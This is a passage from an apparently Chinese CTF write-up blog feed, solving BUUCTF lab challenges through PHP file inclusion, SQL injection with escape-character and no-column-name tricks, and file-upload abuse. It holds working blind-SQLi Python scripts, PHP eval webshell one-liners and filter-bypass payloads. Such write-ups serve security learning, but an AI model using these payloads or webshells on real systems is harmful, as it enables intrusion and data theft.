<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;404.html&quot;</span>;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];</span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data|input|zip/is&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;</span><br><span class="language-php"><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);</span><br><span class="language-php">&#125;</span><br><span class="language-php">@<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>发现data伪协议和input伪协议都被过滤了，看了下其他大佬的wp发现这里用的是一个php特性<br>利用 php7 segment fault 特性<br>大致意思是：使用伪协议php:&#x2F;&#x2F;filter中的string.strip_stags 过滤器 并上传文件 php的垃圾回收机制就不会继续执行 使post传递的文件存储在&#x2F;temp&#x2F;文件下<br>10.利用条件<br>php7.0.0-7.1.2可以利用<br>php7.1.3-7.2.1可以利用<br>php7.2.2-7.2.8可以利用<br>可以获取文件名<br>源代码get参数进行文件包含<br>同时tmp下的文件会放在dir.php中</p><hr><p><strong>dir.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/tmp&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>python脚本</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">import requests</span><br><span class="language-xml">from io import BytesIO</span><br><span class="language-xml">url=&quot;http://cbe0695c-f137-47ee-a477-7a645484bc91.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br><span class="language-xml">#phpfile对应的就是上传的文件的内容</span><br><span class="language-xml">phpfile=&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml">filedata=&#123;</span><br><span class="language-xml">    &quot;file&quot;:phpfile</span><br><span class="language-xml">&#125;</span><br><span class="language-xml">r=requests.post(url=url,files=filedata)</span><br><span class="language-xml">print(r.text)</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><img src="/../image/NPUCTF2020-ezinclude-5.png"></p><p>此时文件是上传上去了的<br>脚本最后会输出BUUCTF容器不存在的页面，但这并不意味着我们操作失败了，按照知识点来说属于是”php崩溃清空堆栈重启”，我们脚本中上传的文件还是存在的。<br>访问dir.php查看我们上传后的文件。</p><p><img src="/../image/NPUCTF2020-ezinclude-6.png"></p><p>找到了我们上传的文件名之后进行目录穿越蚁剑连..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;phpWHPmtj</p><p>然后发现没有flag，结果发现在phpinfo中，只需要重新上传，修改一下上传文件的代码即可</p><p>然后在phpinfo中找到flag</p><p><img src="/../image/NPUCTF2020-ezinclude-7.png"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="php7-segment-fault-特性"><a href="#php7-segment-fault-特性" class="headerlink" title="php7 segment fault 特性"></a>php7 segment fault 特性</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">用伪协议php://<span class="hljs-built_in">filter</span>中的<span class="hljs-keyword">string</span>.strip_stags 过滤器 并上传文件 php的垃圾回收机制就不会继续执行 使<span class="hljs-built_in">post</span>传递的文件存储在/temp/文件下<br><span class="hljs-number">10.</span>利用条件<br>php7<span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">-7.1</span><span class="hljs-number">.2</span>可以利用<br>php7<span class="hljs-number">.1</span><span class="hljs-number">.3</span><span class="hljs-number">-7.2</span><span class="hljs-number">.1</span>可以利用<br>php7<span class="hljs-number">.2</span><span class="hljs-number">.2</span><span class="hljs-number">-7.2</span><span class="hljs-number">.8</span>可以利用<br>可以获取文件名<br>源代码<span class="hljs-built_in">get</span>参数进行文件包含<br>同时tmp下的文件会放在dir.php中<br><br>使用php://<span class="hljs-built_in">filter</span>/<span class="hljs-keyword">string</span>.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp <span class="hljs-built_in">file</span>就会一直留在tmp目录，再进行文件名爆破就可以getshell<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> md5 </tag>
            
            <tag> php7 segment fault 特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019总决赛Day2Web1-Easyweb</title>
      <link href="/2025/04/06/CISCN2019%E6%80%BB%E5%86%B3%E8%B5%9BDay2Web1-Easyweb/"/>
      <url>/2025/04/06/CISCN2019%E6%80%BB%E5%86%B3%E8%B5%9BDay2Web1-Easyweb/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN2019总决赛Day2Web1-Easyweb"><a href="#CISCN2019总决赛Day2Web1-Easyweb" class="headerlink" title="CISCN2019总决赛Day2Web1-Easyweb"></a>CISCN2019总决赛Day2Web1-Easyweb</h1><p>首先启动靶机访问，上来就是一个登录界面</p><p><img src="/../image/CISCN2019%E6%80%BB%E5%86%B3%E8%B5%9BDay2Web1-Easyweb-1.png"></p><p>一开始看到这个界面以为又是xxe，然后抓了个包发现不是，用dirsearch扫一下发现存在robots.txt</p><p>访问一下</p><p><img src="/../image/CISCN2019%E6%80%BB%E5%86%B3%E8%B5%9BDay2Web1-Easyweb-2.png"></p><p>很明显要我们去下载源码</p><p>试了一下index.php、user.php、image.php，发现只有image.php能下载</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">1</span>d9b702f-<span class="hljs-number">7081</span>-<span class="hljs-number">49</span>e6-a523-<span class="hljs-number">34</span>c308217272.node5.buuoj.cn:<span class="hljs-number">81</span>/image.php.bak<br></code></pre></td></tr></table></figure><p>下载下来之后代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-variable">$id</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]:<span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$path</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>]:<span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$path</span>);<br><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$path</span>);<br><br><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;select * from images where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="hljs-subst">&#123;$path&#125;</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);<br><br><span class="hljs-variable">$path</span>=<span class="hljs-string">&quot;./&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>];<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span>);<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$path</span>);<br></code></pre></td></tr></table></figure><p>发现sql执行语句，猜测存在sql注入</p><p>传入两个参数，经过一系列过滤后进行sql查询，我们注意到最后有个 readfile() 函数，尝试构造闭合，但是单引号被过滤了，这里就可以采用 \ 转义字符来进行绕过。</p><p>如果最后传入的 id 值为 \ ，那么sql语句就为：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> images <span class="hljs-keyword">where</span> id = <span class="hljs-string">&#x27;\&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-type">path</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>这里的\将第二个单引号给转义掉了，那么第一个单引号就会找第三个单引号闭合，然后我们就可以在path的值里进行布尔盲注</p><p>我们可以传入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=\\0&amp;path=or <span class="hljs-attribute">1</span>=1 --+<br></code></pre></td></tr></table></figure><p><strong>因为当我们传入的id的值 \0 后，他会先经过addslashes() 函数，出来后的 id 值就变成了 \\0 ,那么在str_replace() 函数中，\0会被换空，最终到sql 语句中就变成了</strong> </p><p>然后就能构造python脚本了</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">import requests<br> <br>url = &#x27;http://a207ac0d-bb73-4659-b0b5-728248675810.node4.buuoj.cn:81/image.php&#x27;<br>flag = &#x27;&#x27;<br> <br>payload1 = &quot;?id=\\0&amp; path=or(ord(substr((<span class="hljs-keyword">select</span>(<span class="hljs-keyword">database</span>())),&#123;&#125;,<span class="hljs-number">1</span>))&gt;&#123;&#125;)%<span class="hljs-number">23</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">payload2 = &quot;</span>?id=\\<span class="hljs-number">0</span>&amp; <span class="hljs-keyword">path</span>=<span class="hljs-keyword">or</span>(ord(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())),&#123;&#125;,<span class="hljs-number">1</span>))&gt;&#123;&#125;)%<span class="hljs-number">23</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">payload3 = &quot;</span>?id=\\<span class="hljs-number">0</span>&amp; <span class="hljs-keyword">path</span>=<span class="hljs-keyword">or</span>(ord(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span>(group_concat(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_name=<span class="hljs-number">0x7573657273</span>)),&#123;&#125;,<span class="hljs-number">1</span>))&gt;&#123;&#125;)%<span class="hljs-number">23</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">payload4 = &quot;</span>?id=\\<span class="hljs-number">0</span>&amp; <span class="hljs-keyword">path</span>=<span class="hljs-keyword">or</span>(ord(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span>(group_concat(username,<span class="hljs-keyword">password</span>))<span class="hljs-keyword">from</span>(users)),&#123;&#125;,<span class="hljs-number">1</span>))&gt;&#123;&#125;)%<span class="hljs-number">23</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">for i in range(1,1000):</span><br><span class="hljs-string">    low =  32</span><br><span class="hljs-string">    high = 128</span><br><span class="hljs-string">    mid = (low + high)//2</span><br><span class="hljs-string">    while(low&lt;high):</span><br><span class="hljs-string">        payload = payload4.format(i,mid)</span><br><span class="hljs-string">        new_url= url+payload</span><br><span class="hljs-string">        r= requests.get(new_url)</span><br><span class="hljs-string">        if &quot;</span>JFIF<span class="hljs-string">&quot; in r.text:</span><br><span class="hljs-string">            low=mid+1</span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">            high=mid</span><br><span class="hljs-string"> </span><br><span class="hljs-string">        mid = (low+high)//2</span><br><span class="hljs-string">    if (mid == 32 or mid == 128):</span><br><span class="hljs-string">        break</span><br><span class="hljs-string">    flag +=chr(mid)</span><br><span class="hljs-string">    print(flag)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">print(flag)</span><br></code></pre></td></tr></table></figure><p>成功跑出账号密码，之后登录</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">admin</span><br>4d656169a6437ad3f073<br></code></pre></td></tr></table></figure><p>登录成功之后发现是一个文件上传页面</p><p><img src="/../image/CISCN2019%E6%80%BB%E5%86%B3%E8%B5%9BDay2Web1-Easyweb-3.png"></p><p>直接上传php文件，发现上传失败，但是可以上传phtml文件</p><p>同时文件中不允许存在php，所以可以使用短标签绕过，试了一下用<code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[1]);&lt;/script&gt;</code>也可以</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">或者</span><br><span class="language-xml">GIF89a <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-number">1</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>然后返回给我们文件上传路径</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">logs/upload.<span class="hljs-number">05571</span>ffc0f0ba134f932c75082af160e.<span class="hljs-built_in">log</span>.php<br></code></pre></td></tr></table></figure><p>但是发现蚁剑无法连接</p><p>我们直接访问一下logs&#x2F;upload.05571ffc0f0ba134f932c75082af160e.log.php看看，发现</p><p><img src="/../image/CISCN2019%E6%80%BB%E5%86%B3%E8%B5%9BDay2Web1-Easyweb-4.png"></p><p>并没有文件内容，只有用户名和文件名在里面。所以文件名才是传马的重点，内容无所谓</p><hr><p>查看大佬题解</p><p>读upload.php源码，不能上传php文件，file_put_contents可以把字符串写到文件中去，这个字符串包含了文件名</p><p>所以我们可以使用用文件名写马 进行连接</p><p>先上传，然后抓包，修改filename</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">filename改为<br>&lt;<span class="hljs-string">?=</span><span class="hljs-variable">@eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>文件上传路径</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">logs/upload.<span class="hljs-number">05571</span>ffc0f0ba134f932c75082af160e.<span class="hljs-built_in">log</span>.php<br></code></pre></td></tr></table></figure><p>然后用蚁剑连接即可拿到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql盲注 </tag>
            
            <tag> sql语句闭合 </tag>
            
            <tag> str_replace </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> 短标签绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020-Ezsqli</title>
      <link href="/2025/04/06/GYCTF2020-Ezsqli/"/>
      <url>/2025/04/06/GYCTF2020-Ezsqli/</url>
      
        <content type="html"><![CDATA[<h1 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="GYCTF2020-Ezsqli"></a>GYCTF2020-Ezsqli</h1><p>打开靶机，发现有个提交表单，应该存在Sql注入，POST传参，id&#x3D;xxx，抓包然后爆破有无过滤字符。</p><p>查看后发现：or、and、union、information_schema……for、floor、rand()、handler、INFORMATION、|、LIEK、from、注释符、分号、括号等都被过滤<br>这里可能要无列名注入</p><p><a href="https://www.cnblogs.com/q1stop/p/18024992">无列名sql注入 - qingshanboy - 博客园</a></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs csharp">无列名注入：用数字代替列名 <br>        <span class="hljs-number">1.</span>使用条件：information_schema这个库都被过滤掉了<br>        <span class="hljs-number">2.</span>使用前提：<br><br>                ①mysql <span class="hljs-number">5.5</span><span class="hljs-number">.8</span>之后开始使用InnoDb作为默认引擎，mysql <span class="hljs-number">5.6</span>的InnoDb增加了innodb_index_stats和innodb_table_stats两张表，但这两张表记录了数据库和表的信息，但是没有列名       <br>        例：        <br>        <span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">group_concat</span>(<span class="hljs-params">database_name</span>) <span class="hljs-keyword">from</span> mysql.innodb_index_stats</span>;        <br>        <br>        <span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">group_concat</span>(<span class="hljs-params">table_name</span>) <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name</span>=database()<br>                ②mysql <span class="hljs-number">5.7</span>开始增加了sys库，用于快速了解系统元数据信息<br>         例：schema_table_statistics_with_buffer<br></code></pre></td></tr></table></figure><p>由于information_schema被过滤了，考虑使用其他关键词，如这里的sys.schema_table_statistics_with_buffer</p><p>   MySQL 5.7开始新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。</p><p>爆表名脚本</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> <span class="hljs-built_in">time</span><br><br>url = <span class="hljs-string">&#x27;http://d92c6c06-eb7e-4fc6-87ee-e5d5b5ca9159.node5.buuoj.cn:81/index.php&#x27;</span><br><br>post_d = &#123;&#125;<br><br><br>def post_text(string):<br>    <span class="hljs-keyword">return</span> requests.post(url=url, data=string).<span class="hljs-built_in">text</span><br><br><br>tables_name = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">200</span>):<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">128</span><br>    <span class="hljs-built_in">mid</span> = (low + high) <span class="hljs-comment">// 2</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        payload_tables = <span class="hljs-string">&#x27;2^(ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)=database()),&#123;0&#125;,1))&lt;&#123;1&#125;)&#x27;</span>.format(i + <span class="hljs-number">1</span>, <span class="hljs-built_in">mid</span>)<br>        post_d[<span class="hljs-string">&#x27;id&#x27;</span>] = payload_tables<br>        re = post_text(post_d)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Error&quot;</span> <span class="hljs-keyword">in</span> re:<br>            high = <span class="hljs-built_in">mid</span><br>        <span class="hljs-keyword">else</span>:<br>            low = <span class="hljs-built_in">mid</span> + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">mid</span> = (low + high) <span class="hljs-comment">// 2</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">mid</span> &lt;= <span class="hljs-number">32</span> or <span class="hljs-built_in">mid</span> &gt;= <span class="hljs-number">127</span>:<br>            <span class="hljs-keyword">break</span><br>    tables_name += chr(<span class="hljs-built_in">mid</span> - <span class="hljs-number">1</span>)<br>    print(tables_name)<br><br></code></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">users233333333333333,</span>f1ag_1s_h3r3_hhhhh<br></code></pre></td></tr></table></figure><p>然后用脚本爆出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_text</span>(<span class="hljs-params">string</span>):<br>    <span class="hljs-keyword">return</span> requests.post(url=url, data=string).text<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>(<span class="hljs-params">char, value</span>):<br>    <span class="hljs-keyword">return</span> value + char<br> <br> <br>url = <span class="hljs-string">&#x27;http://989aa139-17f2-4be4-b687-b5951dcabc57.node5.buuoj.cn:81/index.php&#x27;</span><br>post_d = &#123;&#125;<br>value = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment"># 无列名注入使用</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">128</span><br>    mid = (low + high) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br> <br>        payload = <span class="hljs-string">&#x27;2||((select * from f1ag_1s_h3r3_hhhhh)&lt;(select 1,&quot;&#123;&#125;&quot;))&#x27;</span>.<span class="hljs-built_in">format</span>(get_flag(<span class="hljs-built_in">chr</span>(mid), value))<br>        <span class="hljs-comment"># print(payload)</span><br>        post_d[<span class="hljs-string">&#x27;id&#x27;</span>] = payload<br>        re = post_text(post_d)<br> <br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Nu&quot;</span> <span class="hljs-keyword">in</span> re:<br>            high = mid<br>        <span class="hljs-keyword">else</span>:<br>            low = mid + <span class="hljs-number">1</span><br>        mid = (low + high) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> mid &lt;= <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid &gt;= <span class="hljs-number">127</span>:<br>            <span class="hljs-keyword">break</span><br> <br>    value += <span class="hljs-built_in">chr</span>(mid - <span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(value)<br></code></pre></td></tr></table></figure><p>得到flag，然后转换为小写即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> fuzz测试 </tag>
            
            <tag> 布尔盲注 </tag>
            
            <tag> sys数据库 </tag>
            
            <tag> 无列名注入 </tag>
            
            <tag> 无列名盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HFCTF2020-EasyLogin</title>
      <link href="/2025/04/06/HFCTF2020-EasyLogin/"/>
      <url>/2025/04/06/HFCTF2020-EasyLogin/</url>
      
